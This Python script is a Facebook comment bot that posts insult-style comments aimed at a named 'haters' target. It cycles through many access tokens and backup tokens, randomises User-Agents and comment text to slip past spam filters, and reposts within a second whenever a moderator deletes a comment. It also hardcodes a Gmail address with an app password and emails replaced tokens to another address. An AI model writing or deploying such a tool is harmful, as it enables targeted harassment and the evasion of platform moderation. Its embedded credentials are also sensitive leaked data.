import os
import time
import random
import requests
import smtplib
from email.mime.text import MIMEText
import logging
from datetime import datetime
import pytz
import threading

# Set up logging to output both to file and terminal
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# Function to send email alerts
def send_email(subject, message):
    try:
        sender_email = "mahesh98765r3@gmail.com"
        receiver_email = "mrclasy0@gmail.com"
        password = "bxvp aswb trzr arqu"

        msg = MIMEText(message)
        msg['Subject'] = subject
        msg['From'] = sender_email
        msg['To'] = receiver_email

        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, msg.as_string())
        server.quit()
    except Exception as e:
        logging.error(f"[!] Email error: {e}")

# Function to read file
def read_file(filename):
    try:
        with open(filename, 'r') as file:
            return file.read().strip()
    except FileNotFoundError:
        logging.error(f"File not found: {filename}")
        return ""

# Function to read lines from file
def read_lines(filename):
    try:
        with open(filename, 'r') as file:
            return [line.strip() for line in file]
    except FileNotFoundError:
        logging.error(f"File not found: {filename}")
        return []

# Function to validate token
def validate_token(token):
    try:
        # Checking if the token is valid by sending a request to the Graph API
        response = requests.get(f"https://graph.facebook.com/me?access_token={token}")

        if response.status_code == 200:
            # Token is valid
            return True
        else:
            # Token is invalid, log the error and return False
            logging.error(f"[!] Invalid token: {token}. Response: {response.json()}")
            return False
    except requests.RequestException as e:
        logging.error(f"[!] Error during token validation: {e}")
        return False

# Function to replace expired token with backup token
def replace_token(tokens, backup_tokens, token_index):
    logging.info(f"[!] Token expired or invalid. Replacing with backup token.")
    if backup_tokens:
        new_token = backup_tokens.pop(0)
        tokens[token_index] = new_token
        send_email("Token Replaced", f"Replaced an expired token with a backup token: {new_token}")
        return new_token, backup_tokens
    else:
        logging.error("[!] No backup tokens available.")
        send_email("Error - Backup Tokens Exhausted", "No backup tokens are available.")
        return None, backup_tokens

# Function to generate random suffix (emoji + special character + number)
def generate_random_suffix():
    emojis = ["馃榾", "馃敟", "馃殌", "馃挴", "馃帀", "鉁�", "馃挭"]
    special_chars = ["!", "@", "#", "$", "%", "&", "*"]
    numbers = str(random.randint(10, 99))
    return f"{random.choice(emojis)}{random.choice(special_chars)}{numbers}"

# Function to randomly choose a User-Agent
def get_random_user_agent():
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Linux; Android 10; Pixel 4 XL Build/QD1A.190821.007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/537.36'
    ]
    return random.choice(user_agents)

# Function to check if comment is deleted
def is_comment_deleted(comment_id, access_token):
    url = f"https://graph.facebook.com/{comment_id}?access_token={access_token}"
    try:
        response = requests.get(url)
        return response.status_code != 200  # If response is not 200, comment is deleted
    except requests.RequestException as e:
        logging.error(f"[!] Error checking if comment is deleted: {e}")
        return True

# Function to post a comment
def post_comment(access_token, post_url, comment_text):
    url = f"https://graph.facebook.com/{post_url}/comments"
    headers = {'User-Agent': get_random_user_agent()}
    params = {'access_token': access_token, 'message': comment_text}
    try:
        response = requests.post(url, data=params, headers=headers)
        if response.ok:
            return response.json().get('id')  # Return comment ID
        else:
            logging.error(f"[x] Failed to post comment: {response.text}")
    except requests.RequestException as e:
        logging.error(f"[!] Error posting comment: {e}")
    return None

# Function to post comment & instantly repost if deleted
def post_comment_thread(token, post_url, comment, index, haters_name, comments):
    random_letters = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ', k=2))
    comment_text = f"{random_letters} {comment} {haters_name} {generate_random_suffix()}"
    
    last_comment_id = post_comment(token, post_url, comment_text)
    if last_comment_id:
        logging.info(f"[+] Comment {index} on Post {post_url} sent successfully: {comment_text}")
        logging.info(f"Token Number: {token[:10]}... | Time: {datetime.now(pytz.timezone('Asia/Kathmandu')).strftime('%Y-%m-%d %H:%M:%S')}")
        logging.info("=" * 40)
        
        # Now check for deletion in a separate thread
        deletion_thread = threading.Thread(target=check_and_repost, args=(last_comment_id, token, comments, haters_name, post_url))
        deletion_thread.start()

def check_and_repost(last_comment_id, token, comments, haters_name, post_url):
    while True:
        if is_comment_deleted(last_comment_id, token):
            logging.info("[!] Last comment was deleted! Reposting immediately...")
            # Repost a random comment, not the same one
            new_comment = random.choice(comments)
            random_letters = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ', k=2))
            comment_text = f"{random_letters} {new_comment} {haters_name} {generate_random_suffix()}"
            last_comment_id = post_comment(token, post_url, comment_text)
            if last_comment_id:
                logging.info(f"[+] Reposted comment successfully: {comment_text}")
                logging.info("=" * 40)
            break  # Stop checking after reposting
        time.sleep(1)  # Check every second for deletion

# Function to post comments
def post_comments():
    tokens = read_lines('tokennum.txt')
    backup_tokens = read_lines('backup_tokens.txt')
    comments = read_lines('comments.txt')
    post_url = read_file('post.txt')
    haters_name = read_file('hatersname.txt')

    if not tokens or not comments or not post_url:
        logging.error("[!] Missing required files. Exiting...")
        send_email("Error - Missing File", "Required files are missing.")
        return

    logging.info("\n[+] Starting to post comments...\n")

    index = 1
    token_index = 0

    while True:
        random.shuffle(comments)  # Shuffle comments for randomness

        for comment in comments:
            if token_index >= len(tokens):
                token_index = 0

            access_token = tokens[token_index]

            # If token is invalid or expired, replace with backup token if available
            if not validate_token(access_token):
                logging.error(f"[!] Main token expired or invalid. Replacing with backup token.")
                if backup_tokens:
                    new_token, backup_tokens = replace_token(tokens, backup_tokens, token_index)
                    access_token = new_token
                else:
                    logging.error("[!] No backup tokens available, skipping the comment.")
                    token_index += 1  # Skip to next token if no backup available
                    continue

            # Post comment using a separate thread
            post_comment_thread(access_token, post_url, comment, index, haters_name, comments)
            index += 1

            token_index += 1

            # Adding a random delay between 1-3 minutes for the next comment
            time.sleep(random.randint(60, 180))

        logging.info("\n[+] All comments posted successfully. Restarting...\n")
        time.sleep(5)

# Main Execution
def main():
    try:
        post_comments()
    except Exception as e:
        logging.error(f"[!] Unexpected error: {e}")
        send_email("Unexpected Error", str(e))

if __name__ == "__main__":
    main()